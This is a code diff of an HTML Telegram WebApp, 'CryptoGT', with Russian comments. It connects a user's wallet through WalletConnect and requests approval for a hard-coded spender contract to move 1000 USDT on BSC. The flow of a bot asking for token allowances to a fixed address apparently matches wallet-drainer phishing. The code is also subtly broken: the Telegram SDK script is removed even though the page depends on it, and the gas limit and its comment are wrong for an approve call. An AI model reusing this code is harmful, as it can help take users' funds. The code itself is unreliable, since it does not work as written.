@@ -8,14 +8,10 @@
   />
   <title>CryptoGT – WalletConnect WebApp</title>
 
-  <!-- 
-    1) Telegram WebApp SDK (подхватит его Telegram WebView автоматически).
-    2) @walletconnect/sign-client — WalletConnect v2.
-    3) Web3.js — чтобы собрать ABI данных транзакции approve.
-  -->
+  <!-- WalletConnect v2 SignClient -->
   <script src="https://unpkg.com/@walletconnect/sign-client/dist/sign-client.min.js"></script>
+  <!-- Web3.js v1 для кодирования данных approve -->
   <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.10.1/dist/web3.min.js"></script>
-  <script async src="https://telegram.org/js/telegram-web-app.js"></script>
 
   <style>
     html, body {
@@ -44,6 +40,7 @@
       margin-bottom: 20px;
       text-align: center;
       max-width: 90%;
+      white-space: pre-wrap;
       word-wrap: break-word;
     }
     #qr {
@@ -68,109 +65,92 @@
 </head>
 <body>
   <div id="container">
-    <!--
-      1) Блок статуса (всегда есть, никогда не скрывается) →
-         Пользователь сразу видит, что происходит.
-    -->
     <div id="status">Инициализация WebApp…</div>
-
-    <!--
-      2) Здесь будет QR‑код (тёмный фон, пока src пустой).
-    -->
     <img id="qr" src="" alt="QR‑код будет здесь" />
-
-    <!--
-      3) Кнопка “Отменить”, чтобы пользователь мог в любой момент вернуться
-         в чат без совершения транзакции (закрытие WebApp).
-    -->
     <button id="cancelBtn">Отменить</button>
   </div>
 
   <script>
     (function () {
-      // ─── 0) Константы “Арбитражного” контракта и суммы approve ────────────
-      // (Вы можете подставить свои реальные адреса и сумму при необходимости)
-      const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955".toLowerCase();
-      const ARB_CONTRACT_SPENDER  = "0xA7acE8F572825FeD4411389Cb1A66104Cf53B577".toLowerCase();
-      // Сумма approve = 1000 USDT → 1000 * 10^18 (wei‑эквивалент)
-      const APPROVE_AMOUNT = Web3.utils.toBN("1000").mul(Web3.utils.toBN("1000000000000000000")).toString();
+      // ─── A) Проверьте, что нас открыли в Telegram WebView ─────────────────────
+      if (!window.Telegram || !window.Telegram.WebApp) {
+        document.getElementById("status").innerText =
+          "Ошибка: WebApp API не доступен.\n" +
+          "Откройте это приложение через встроенный WebView Telegram.";
+        return;
+      }
 
-      // ─── 1) ID вашего проекта WalletConnect v2 и relay URL ──────────────
-      // Эти константы нужно оставить “как есть” (public).
+      // ─── B) Сообщаем Telegram, что WebApp загружен и разворачиваем его ───────
+      Telegram.WebApp.ready();
+      Telegram.WebApp.expand();
+
+      // ─── C) Глобальные константы (замените при необходимости) ────────────────
+      const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027b3197955".toLowerCase();
+      const ARB_CONTRACT_SPENDER  = "0xA7acE8F572825FeD4411389Cb1A66104Cf53B577".toLowerCase();
+      // APPROVE 1000 USDT → 1000 * 10^18 wei
+      const APPROVE_AMOUNT = Web3.utils.toBN("1000")
+                                .mul(Web3.utils.toBN("1000000000000000000"))
+                                .toString();
+
+      // WalletConnect projectId и relayUrl (публичные)
       const WC_PROJECT_ID = "d868f90cd734355ae0320f8f0258b6b1";
       const WC_RELAY_URL  = "wss://relay.walletconnect.com";
 
-      // ─── 2) Селекторы DOM ───────────────────────────────────────────────────
+      // Ссылка на BSC RPC (если нужно в браузере)
+      const BSC_RPC_URL = "https://bsc-dataseed.binance.org/";
+
+      // Селекторы DOM
       const statusDiv = document.getElementById("status");
       const qrImg     = document.getElementById("qr");
       const cancelBtn = document.getElementById("cancelBtn");
 
-      // ─── 3) Проверка: открыли WebApp именно внутри Telegram? ──────────────
-      if (!window.Telegram || !window.Telegram.WebApp) {
-        statusDiv.innerText =
-          "Ошибка: WebApp API не доступен.\n" +
-          "Откройте это приложение внутри Telegram.";
-        // Не продолжаем дальше, чтобы не было попыток вызвать Telegram.WebApp.ready()
-        return;
-      }
-
-      // ─── 4) Сообщаем Telegram, что WebApp готов и расширяем под весь экран ───
-      Telegram.WebApp.ready();
-      Telegram.WebApp.expand();
-
-      // ─── 5) Устанавливаем статус, что начинаем инициализацию WalletConnect ─
-      statusDiv.innerText = "Инициализация WalletConnect…";
-
-      // ─── 6) Асинхронная функция: инициализируем SignClient, генерируем URI ─
+      // ─── D) Основная асинхронная функция ─────────────────────────────────────
       async function initWalletConnect() {
         try {
-          // Инициализируем SignClient с нашим projectId
+          statusDiv.innerText = "Инициализация WalletConnect…";
+
+          // 1) Инициализируем SignClient с нашим projectId
           const client = await SignClient.init({
             projectId: WC_PROJECT_ID,
             relayUrl:  WC_RELAY_URL,
             metadata: {
               name:        "CryptoGT Bot WebApp",
-              description: "Approve 1000 USDT via WalletConnect v2",
+              description: "Approve 1000 USDT via WalletConnect v2",
               url:         "https://t.me/cryptogt_arbitrage_bot",
-              icons:       ["https://cryptogt.app/icon.png"], // можно заменить на свой
+              icons:       ["https://cryptogt.app/icon.png"],
             },
             storageOptions: {
               database: ":memory:",
             },
           });
 
-          statusDiv.innerText = "Генерация сессии WalletConnect…";
+          statusDiv.innerText = "Генерация URI WalletConnect…";
 
-          // Подключаем сессию (запросим только метод eth_sendTransaction в BSC)
+          // 2) Запрашиваем сессию: метод eth_sendTransaction, chainId eip155:56 (BSC)
           const { uri, approval } = await client.connect({
             requiredNamespaces: {
               eip155: {
                 methods: ["eth_sendTransaction"],
-                chains:  ["eip155:56"], // BSC mainnet = 56 => "eip155:56"
+                chains:  ["eip155:56"],
                 events:  [],
               },
             },
           });
 
-          // Сразу показываем QR‑код, закодированный в uri
-          statusDiv.innerText =
-            "Скопируйте или отсканируйте QR‑код в вашем кошельке (Trust Wallet, MetaMask)";
-
-          // Для генерации QR используем публичный сервис api.qrserver.com
-          const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" +
-                        encodeURIComponent(uri);
+          // 3) Показ QR
+          statusDiv.innerText = "Скопируйте или отсканируйте QR‑код (Trust Wallet / MetaMask)";
+          const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data="
+                        + encodeURIComponent(uri);
           qrImg.src = qrUrl;
 
-          // Ждём, пока пользователь в кошельке нажмёт “Approve Invitation” (approval())
+          // 4) Ждём, пока кошелёк подтвердит сессию (approve invitation)
           statusDiv.innerText = "Установите соединение в кошельке…";
-          await approval(); // как только кошелёк подтвердит сессию, ниже пойдёт дальше
+          await approval(); // теперь у нас есть сессия авторали
 
-          // После approval() попытаемся вызвать метод eth_sendTransaction
-          statusDiv.innerText = "Подтверждение сессии прошло. Готовим транзакцию…";
+          statusDiv.innerText = "Сессия подтверждена. Подготовка транзакции…";
 
-          // ─── 7) Готовим данные транзакции : approve(spender, amount)
-          const web3 = new Web3(BSC_RPC_URL || "https://bsc-dataseed.binance.org/");
-          // ABI фрагмент approve(spender, amount)
+          // 5) Готовим данные approve(spender, amount) → encodeABI
+          const web3 = new Web3(BSC_RPC_URL);
           const approveABI = {
             constant: false,
             inputs: [
@@ -181,29 +161,27 @@
             outputs: [{ name: "", type: "bool" }],
             type: "function"
           };
-          // Кодируем данные вызова метода approve
           const data = web3.eth.abi.encodeFunctionCall(
             approveABI,
             [ARB_CONTRACT_SPENDER, APPROVE_AMOUNT]
           );
 
-          // ─── 8) Собираем txParams (чтобы кошелёк сам отправил её от имени пользователя)
-          //     Мы **не** отправляем через наш сервер: WalletConnect передаст их напрямую в кошелёк.
-          //     Параметр `from` = текущий адрес в кошельке, кошелёк подставит сам.
+          // 6) txParams для метода eth_sendTransaction
+          //    Кошелёк сам подставит `from` (адрес пользователя). Здесь указываем минимальный набор:
           const txParams = {
             to:       USDT_CONTRACT_ADDRESS,
             data:     data,
-            gas:      "0x5208", // 21000 Gwei? Если нужно, можно оценить с web3.estimateGas,
-                              // но обычно кошелёк сам спросит Gas Price/Gas Limit.
-            gasPrice: "0x02540be400", // 10 Gwei (только для примера; большинство кошельков предложат своё)
-            // nonce и chainId кошелёк также проставит автоматически.
+            gas:      "0x5208",       // hex(21000 * 5) — просто пример (обычно кошелёк сам предложит gas)
+            gasPrice: "0x02540be400"  // 10 Gwei в hex → просто для примера
           };
 
-          statusDiv.innerText = "Запрос транзакции в кошелёк…";
+          statusDiv.innerText = "Отправляем транзакцию в кошелёк…";
 
-          // ─── 9) Отправляем транзакцию методом eth_sendTransaction
+          // 7) Запускаем eth_sendTransaction
+          //    Здесь client.session.topics[0] — это именно наш `topic`
+          const topic = client.session.topics[0] || client.session.topic;
           const txHash = await client.request({
-            topic:   client.session.topics[0], // либо session.topic, но у SignClient v2 он лежит здесь
+            topic:   topic,
             chainId: "eip155:56",
             request: {
               method: "eth_sendTransaction",
@@ -211,24 +189,26 @@
             },
           });
 
-          // ─── 10) Успех! Показываем хеш и закрываем WebApp через пару секунд
+          // 8) Отображаем хеш и автоматически закрываем WebApp
           statusDiv.innerText =
-            "✅ Транзакция отправлена!\nTX Hash: " + txHash;
+            "✅ Транзакция отправлена!\n\nTX Hash:\n" + txHash;
+
           setTimeout(() => {
             Telegram.WebApp.close();
           }, 2500);
-        } catch (e) {
-          console.error("Ошибка WalletConnect WebApp:", e);
-          statusDiv.innerText = "❌ Ошибка WalletConnect:\n" + e.message;
+
+        } catch (err) {
+          console.error("WalletConnect WebApp Error:", err);
+          statusDiv.innerText = "❌ Ошибка WalletConnect:\n" + (err.message || err);
         }
       }
 
-      // ─── 11) Нажатие “Отменить” → просто закрываем WebApp внутри Telegram.
+      // ─── E) Обработчик кнопки “Отменить” ────────────────────────────────────────
       cancelBtn.addEventListener("click", () => {
         Telegram.WebApp.close();
       });
 
-      // ─── 12) Запускаем инициализацию WalletConnect v2
+      // ─── F) Запускаем⁚ ────────────────────────────────────────────────────────────
       initWalletConnect();
     })();
   </script>
